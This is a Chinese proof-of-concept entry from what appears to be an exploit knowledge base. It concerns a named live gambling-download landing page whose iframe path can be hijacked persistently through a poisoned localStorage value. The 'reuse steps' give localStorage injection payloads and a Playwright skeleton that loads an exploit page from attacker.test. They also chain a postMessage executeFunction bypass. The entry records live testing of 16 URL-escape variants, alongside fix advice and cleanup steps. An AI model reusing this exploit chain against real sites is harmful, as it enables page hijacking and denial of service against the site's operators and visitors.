# 落地页 localStorage['query'] 优先于 URL → channelCode 未经校验拼入 iframe src（持久化 channelID 路径段注入 / DOM XSS 落地页劫持）

- **code**: landing-page-localstorage-query-channelcode-iframe-src-path
- **kind**: poc
- **category**: auth-bypass
- **component**: 静态下载落地页（landingpoker.*.js bundle + 内联 iframe#ifr，CloudFront + IIS）
- **versions**: landingpoker.d3dcf0a5.js（实测 bundle）
- **severity**: medium
- **language**: markdown
- **source**: manual
- **verified**: 1
- **verified_note**: task#614，2026-11-04 在 https://download.winners.club/（Chrome 157 + Playwright，真目标非本地 mock）实测：① 借 finding 8424 的同源 JS 执行写入 localStorage['query']='channelCode=2/index.html#' 后，关闭攻击页、在同一 context 全新打开落地页（页面内不含任何攻击者代码），#ifr 属性变为 template/2/index.html#/69/1724841854/index.html?v=2025-05-28 01:06，绝对地址 https://download.winners.club/template/2/index.html，HTTP 200 / 7775B，证明持久化跨标签生效；② channelCode=PWNED8435 时加载不存在的模板目录 → 404 154B 白屏；③ 另用真实 Chrome URL 解析器测 16 种逃逸变体（//attacker.test、\、%2f%2f、..%2f..%2f、http:%2f%2f、@、%00、////、%252f、data:、javascript:、../..）解析后 host 恒为 download.winners.club，证实【不能】指向攻击者源，故本条只登记已验证的落地页替换/白屏与跨渠道模板切换，不夸大。产物 exp8446.py / urltest8446.py / exp8446_out.txt / urltest8446_out.txt，测后已 CLEANUP_LS 清除目标源 localStorage。
- **path**: pocs/landing-page-localstorage-query-channelcode-iframe-src-path/poc.md
- **tags**: dom-xss,localStorage,xss-persistence,iframe-src,path-segment,unvalidated-redirect,landing-page,cloudfront,iis,negative-escape
- **created_at**: 2026-11-04T11:06:01.455Z
- **engine**: https://download.winners.club/
- **found_by**: exploit

## 描述

取参函数优先读 localStorage['query'] 再读 location.search，取出的 channelCode 不做任何校验即赋给 config.channelID，拼成 'template/'+channelID+'/'+id+'/'+upload_version+'/index.html' 作为页内 iframe 的 src。因此一旦攻击者在该源拿到一次 JS 执行（如 postMessage 校验缺陷），写一次 localStorage 即可让受害者之后每次打开落地页都被持久导向任意同源模板路径。危害上限为落地页替换/白屏 DoS/跨渠道模板切换，无法指向攻击者源、无法形成持久代码执行。

## 用法

```
1) 侦察：curl 落地页 → 取 /js/landingpoker.<hash>.js；grep 'localStorage.getItem("query")'、'channelCode'、'template/'、'ifr'。命中「先读 localStorage 再读 location.search、无白名单」即具备本条前提。
2) 前置：先拿到同源 JS 执行（本家族用 postMessage source 校验绕过，见 kb code postmessage-仅校验-source-的-executefunction-绕过-跨源导航被校验子帧-new），在目标源执行一行：
   localStorage['query'] = 'channelCode=<PAYLOAD>';
3) 验证持久化：关闭攻击页 → 同 profile 全新标签打开 https://<target>/ → 读 #ifr 的 src 属性，应变为 template/<PAYLOAD>/<id>/<ver>/index.html，且该 URL 返回 200（模板存在）或 404 154B（模板不存在=白屏）。
4) 快速手工复现（无需 XSS，仅验证取参优先级）：在控制台 localStorage['query']='channelCode=2/index.html#/69/1724841854/index.html' 后刷新，观察 iframe 是否加载 /template/2/index.html；再清掉 localStorage 与 ?channelCode= 对比，确认 localStorage 优先。
5) 收尾必须清理：localStorage.removeItem('query')。
判据：iframe src 的路径段完全由攻击者字符串决定、且刷新后（含新标签）仍然生效 = 持久化成立。
失败常见原因：① 页面每次加载先把 localStorage 用 URL 参数覆盖（需按实际顺序确认）；② iframe 有 CSP frame-src 白名单；③ 模板目录不存在返回 404 但被前端隐藏，需看网络面板而非页面观感；④ 用 file:// 或无痕多开导致 storage 不共享。
```

## 正文

```
# 落地页 channelID 持久化劫持（localStorage['query'] 污染 → iframe src 路径段注入）

## 一、缺陷点（bundle 源码层）
文件：`/js/landingpoker.<hash>.js`（实测 d3dcf0a5）

```js
// 取参函数：localStorage 优先于 URL
function g(){
  var s = localStorage.getItem('query');      // ← 优先级 1，攻击者可控且持久
  if (s) { /* 解析 s 成 kv */ }
  else   { /* 解析 location.search */ }
  return kv;
}

var config = {};
config.channelID = g().channelCode;           // ← 无任何校验 / 无白名单
// ...
ifr.src = 'template/' + config.channelID + '/' + id + '/' + upload_version + '/index.html';
```

要点三点，缺一不可：
1. 路由来源包含 `localStorage`（跨导航持久）；
2. `localStorage` 的优先级 **高于** `location.search`（URL 无法覆盖它）；
3. `channelCode` 直接进相对路径 `template/<channelID>/...`，未过滤 `/ \ . % # ?`。

## 二、前置条件
- 目标站可被第三方页面内嵌（无 X-Frame-Options / CSP frame-ancestors）。
- 已取得一次该源下的 JS 执行（本条不负责拿执行权，只负责把一次性执行升级为持久化）。
  同家族常用入口：message 监听只校验 `event.source === ifr.contentWindow`，
  见 kb `postmessage-仅校验-source-的-executefunction-绕过-跨源导航被校验子帧-new`。

## 三、复用步骤
### 1. 写入（在目标源执行，任一 JS 执行点均可）
```js
localStorage['query'] = 'channelCode=2/index.html#';
// 或
localStorage['query'] = 'channelCode=PWNED8435';   // 指向不存在的模板 → 白屏
```

### 2. 端到端触发（Playwright / Puppeteer 骨架）
```python
# 攻击页内嵌目标页，等 #ifr 出现后把子帧导航到攻击者内层页，内层页 postMessage 触发 new Function
page.goto("https://attacker.test/exploit.html")     # 内含 <iframe src="https://target/"> + 轮询导航
# 内层页执行：
#   parent.postMessage({action:'executeFunction',
#                       functionBody:"localStorage['query']='channelCode=2/index.html#'"}, '*')
page.close()

# 关键验证：全新打开，不带任何攻击者上下文/参数
page2 = ctx.new_page()
page2.goto("https://target/")
print(page2.eval_on_selector("#ifr", "e=>e.getAttribute('src')"))
print(page2.eval_on_selector("#ifr", "e=>e.src"))
# 期望：
#   template/2/index.html#/69/1724841854/index.html?v=...
#   https://target/template/2/index.html#/...
# 且该 URL 网络响应 200（实测 7775B）
```

### 3. 判据
- `#ifr` 的 `src` 路径段 == 注入字符串；
- 关闭攻击页 / 新开标签后依然成立（持久化）；
- iframe 请求本身 200（模板存在）或 404 154B（模板不存在，前端白屏）。

## 四、实测结果
| 场景 | 结果 |
|---|---|
| `channelCode=2/index.html#` | iframe → `/template/2/index.html`，HTTP 200 / 7775B |
| `channelCode=105001/69/1724841854` | 同一模板文件 200（跨渠道模板切换） |
| `channelCode=PWNED8435` / `1` / `105` | 404 / 154B → 白屏 DoS |
| 关闭攻击页后新标签重开 | 仍生效（同 profile） |

## 五、证否记录（重要，别重复踩）
用真实 Chrome URL 解析器逐一解析 16 种逃逸变体，解析后的 `host` **全部**是目标域：
```
//attacker.test    \    %2f%2f    ..%2f..%2f    http:%2f%2f
@    %00    ////    %252f    data:    javascript:    ../..
```
原因：`channelID` 永远出现在相对路径 `template/` 之后，不可能成为 authority；
反斜杠被规范化成路径分隔符。所以：
- ❌ 不能把 iframe 指向攻击者源（无持久化代码执行）；
- ❌ 未能借 `../` 读到 `/config/.env`（CloudFront 会归一化/分流，实测落到 .json 第二 origin 502 或 404）；
- 目标为 CloudFront + 纯静态 IIS，全站仅 GET/HEAD，无可写面 → 不能落地 WebShell/服务器会话。

## 六、影响定级
medium。把「单会话改写」升级为「跨导航/跨标签持久劫持」，用户端无提示；
上限 = 落地页替换 / 白屏 DoS / 跨渠道模板切换。

## 七、修复建议
1) `channelCode` 白名单 `^[A-Za-z0-9_-]{1,32}$`，禁 `/ \ . % # ?`；
2) 不信任 localStorage 作为路由/配置来源（或校验后再用）；
3) message 监听校验 `origin + source`，移除 `new Function`；
4) 加 CSP（禁 `unsafe-eval`、限 `frame-src`）与 `X-Frame-Options`。

## 八、清理
```js
localStorage.removeItem('query');
```

```
